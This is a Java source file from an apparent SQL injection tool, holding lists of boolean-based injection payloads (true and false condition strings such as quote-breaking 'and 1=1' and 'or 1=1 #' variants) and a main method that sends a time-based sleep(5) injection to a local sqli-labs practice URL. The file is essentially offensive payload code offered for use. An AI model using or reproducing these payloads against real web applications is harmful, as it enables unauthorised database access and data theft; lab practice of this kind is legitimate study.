package com.sql.sqlinjecttool.payload;

import com.sql.sqlinjecttool.util.HttpSend;

import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;


//
public class BooleanPayload {
    public static List booleanTurePayload = Arrays.asList(
            " and 1=1 ",
            ") and (1=1  ",
            "' and '1'='1 ",
            "') and ('1'='1",
            "\" and \"A\"=\"A",
            "\")and (\"1\"=\"1 ",
            " or 1=1 #",
            ") or (1=1) #",
            "' or '1'='1\' #",
            "') or ('1'='1\')#",
            "\" or \"A\"=\"A\'#",
            "\")or (\"1\"=\"1\") #"
    );
    public static List booleanFalesPayload = Arrays.asList(
            " and 1=2 ",
            ") and (1=2  ",
            "' and '1'='2 ",
            "') and ('1'='2",
            "\" and \"A\"=\"B",
            "\")and (\"1\"=\"2 ",
            " or 1=12 #",
            ") or (1=12) #",
            "' or '1'='12' #",
            "') or ('1'='12)#",
            "\" or \"A\"=\"A2#",
            "\")or (\"1\"=\"12\") #"
    );


    public static void main(String[] args) throws MalformedURLException {
        URL url = new URL("http://www.baidu.com");
        HttpURLConnection connection = HttpSend.sendHttpRequest("http://127.0.0.1/sqli-labs/Less-10/?id=2\" and sleep(5) and \"A\"=\"A ", "GET");
        System.out.println( connection.getConnectTimeout());
    }
}
